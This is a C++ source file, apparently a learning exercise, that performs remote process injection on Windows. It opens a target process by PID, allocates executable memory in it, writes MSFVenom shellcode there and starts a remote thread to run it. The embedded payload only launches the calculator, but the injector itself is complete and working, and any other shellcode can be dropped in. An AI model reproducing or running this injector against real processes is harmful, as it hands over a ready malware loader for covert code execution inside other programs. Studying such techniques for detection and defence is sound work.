#include <iostream>
#include <Windows.h>
#include <string>

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;


unsigned char Calculator[] =

"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

//The shell code above is generated from MSFVenom and is a command to spawn the calculator

int main(int argc, char* argv[]) {

	if (argc < 2) {

		std::cerr << "Usage: " << argv[0] << " <PID of the process you want to inject>" << std::endl;

		//This is quick documentation for what needs to be input as the arguments for the PE

		return 1;
	}

	try {
		PID = std::stoi(argv[1]);

		if (PID % 4 != 0) {
			std::cout << "Please enter a valid PID that is a multiple of 4" << std::endl;
			return 1;
		}
		//This is some quick checks for confirming that the PID is the correct type and value.
		// 
		//Though PIDs dont necessarily have to be multiples of 4 it is common practice and I check for it. 
	}
	catch (const std::exception& e) {

		std::cerr << "Please enter a proper PID of the INT type " << e.what() << std::endl;
	}

	std::cout << "PID: " << PID << " was accepted, now trying to open a Handle" << std::endl;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); /*I then open a handle to the process. If the process is protected,
															  you you get a permission error. For this scenario I use the Process_all_acsess*/

															  //I check for a NULL return value and print the associated error
	if (hProcess == NULL) {
		std::cout << "Couldnt get a Handle, probally permission error but check the error -> " << GetLastError() << std::endl;
		return 1;
	}


	std::cout << "Got a process handle -> " << hProcess << std::endl;

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Calculator), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	//I allocate the vitrual memory for the shell code we are trying to execute

	if (rBuffer == NULL) {
		std::cout << "couldnt create rBuffer error -> " << GetLastError() << std::endl;
	}
	//This does a quick Buffer check to make sure NULL isnt return
	else {

		WriteProcessMemory(hProcess, rBuffer, Calculator, sizeof(Calculator), NULL);

		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

		//I write my shell code to memory then create remote thread and Viola -> ProcessInjection

		if (hThread == NULL) {
			std::cout << "Couldnt get a handle to the thread, the error is -> " << GetLastError() << std::endl;
			CloseHandle(hProcess);
			return 1;

		}
		else {

			std::cout << R"( 
						________  ___  ___  ________  ________  _______   ________   ________      
						|\   ____\|\  \|\  \|\   ____\|\   ____\|\  ___ \ |\   ____\ |\   ____\     
						\ \  \___|\ \  \\\  \ \  \___|\ \  \___|\ \   __/|\ \  \___|_\ \  \___|_    
						 \ \_____  \ \  \\\  \ \  \    \ \  \    \ \  \_|/_\ \_____  \\ \_____  \   
						  \|____|\  \ \  \\\  \ \  \____\ \  \____\ \  \_|\ \|____|\  \\|____|\  \  
							____\_\  \ \_______\ \_______\ \_______\ \_______\____\_\  \ ____\_\  \ 
						   |\_________\|_______|\|_______|\|_______|\|_______|\_________\\_________\
						   \|_________|                                      \|_________\|_________|
																									)" << std::endl;
		}


	}

	CloseHandle(hProcess);
	CloseHandle(hThread);


	return 0;
}